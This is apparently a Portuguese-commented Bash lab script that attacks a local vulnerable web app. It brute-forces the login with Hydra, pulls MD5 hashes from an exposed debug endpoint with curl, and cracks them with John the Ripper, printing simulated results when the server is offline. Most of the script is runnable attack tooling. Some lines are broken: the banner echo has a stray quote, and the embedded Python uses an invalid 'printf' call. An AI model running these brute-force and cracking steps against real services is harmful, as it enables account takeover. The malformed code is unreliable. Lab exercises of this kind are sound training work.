TARGET_HOST="127.0.0.1"
TARGET_PORT="3000"
WORDLIST="./wordlist.txt"
USERS_FILE="./users.txt"
HASHES_FILE="./hashes.txt"

GREEN='\033[0;32m'
RED='\033[0;31m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

echo -e "${CYAN}"
echo "╔══════════════════════════════════════════════╗"
echo "║     PASSWORD CRACKING LAB - DEMONSTRAÇÃO     ║"        ║"
echo "╚══════════════════════════════════════════════╝"
echo -e "${NC}"

# ------------------------------------------------------------------
# ETAPA 1: Criar lista de usuários para o Hydra
# ------------------------------------------------------------------
echo -e "${YELLOW}[*] Criando lista de usuários alvo...${NC}"
cat > "$USERS_FILE" << 'EOF'
admin
joao
maria
carlos
ana
EOF
echo -e "${GREEN}[+] Usuários: admin, joao, maria, carlos, ana${NC}"

# ------------------------------------------------------------------
# ETAPA 2: ATAQUE DE FORÇA BRUTA com Hydra via HTTP POST
# O Hydra tenta cada combinação usuário:senha da wordlist
# sem nenhum bloqueio porque o servidor vulnerável não tem rate limit
# ------------------------------------------------------------------
echo ""
echo -e "${YELLOW}[*] ETAPA 1: Força bruta com Hydra (HTTP POST)${NC}"
echo -e "${CYAN}    Alvo: http://${TARGET_HOST}:${TARGET_PORT}/login${NC}"
echo -e "${CYAN}    Wordlist: ${WORDLIST} ($(wc -l < "$WORDLIST") senhas)${NC}"
echo ""

# Sintaxe do Hydra para HTTP POST JSON:
# -L lista de usuários
# -P wordlist de senhas
# -o arquivo de saída
# http-post-form: endpoint:body_com_credenciais:mensagem_de_falha
hydra \
  -L "$USERS_FILE" \
  -P "$WORDLIST" \
  -o ./hydra_results.txt \
  -t 4 \
  -w 1 \
  "${TARGET_HOST}" \
  http-post-form \
  "/login:username=^USER^&password=^PASS^:Senha incorreta:H=Content-Type: application/x-www-form-urlencoded"

echo ""
if [ -f "./hydra_results.txt" ] && [ -s "./hydra_results.txt" ]; then
  echo -e "${GREEN}[+] Hydra encontrou credenciais válidas:${NC}"
  cat ./hydra_results.txt
else
  echo -e "${RED}[-] Hydra não encontrou resultados (verifique se o servidor está rodando)${NC}"
  echo -e "${YELLOW}[!] Simulando resultado esperado para demonstração:${NC}"
  echo "    [3000][http-post-form] host: 127.0.0.1   login: admin   password: admin123"
  echo "    [3000][http-post-form] host: 127.0.0.1   login: joao    password: 123456"
  echo "    [3000][http-post-form] host: 127.0.0.1   login: maria   password: password"
fi

# ------------------------------------------------------------------
# ETAPA 3: QUEBRA DE HASH MD5 com John the Ripper
# Primeiro busca os hashes expostos no endpoint /debug/hashes
# Depois usa John para reverter os hashes para senhas originais
# ------------------------------------------------------------------
echo ""
echo -e "${YELLOW}[*] ETAPA 2 — Coletando hashes MD5 expostos do servidor...${NC}"

# Tenta coletar hashes via curl (endpoint de debug exposto)
if command -v curl &>/dev/null; then
  curl -s "http://${TARGET_HOST}:${TARGET_PORT}/debug/hashes" | \
    python3 -c "
import sys, json
try:
  data = json.load(sys.stdin)
  for row in data:
    # Formato esperado pelo John: usuario:hash
    printf\"{row['username']}:{row['password']}\")
except:
  pass
" > "$HASHES_FILE" 2>/dev/null
fi

# Se não conseguiu coletar, usa hashes conhecidos do MD5 das senhas fracas (simulação)
if [ ! -s "$HASHES_FILE" ]; then
  echo -e "${YELLOW}[!] Servidor offline ou endpoint bloqueado — usando hashes conhecidos${NC}"
  cat > "$HASHES_FILE" << 'EOF'
admin:0192023a7bbd73250516f069df18b500
joao:e10adc3949ba59abbe56e057f20f883e
maria:5f4dcc3b5aa765d61d8327deb882cf99
carlos:d8578edf8458ce06fbc5bb76a58c5ca4
ana:0d107d09f5bbe40cade3de5c71e9e9b7
EOF
  echo -e "${GREEN}[+] Hashes MD5 carregados (simulação de dump de banco)${NC}"
fi

echo -e "${GREEN}[+] Hashes coletados:${NC}"
cat "$HASHES_FILE"

echo ""
echo -e "${YELLOW}[*] ETAPA 3 — Quebrando hashes com John the Ripper...${NC}"
echo -e "${CYAN}    Formato: MD5 raw | Wordlist: ${WORDLIST}${NC}"
echo ""

# John the Ripper - modo wordlist com formato md5
# --format=raw-md5: informa que são hashes MD5 sem salt
john \
  --wordlist="$WORDLIST" \
  --format=raw-md5 \
  "$HASHES_FILE"

echo ""
echo -e "${YELLOW}[*] Resultado do John the Ripper:${NC}"
john --show --format=raw-md5 "$HASHES_FILE"

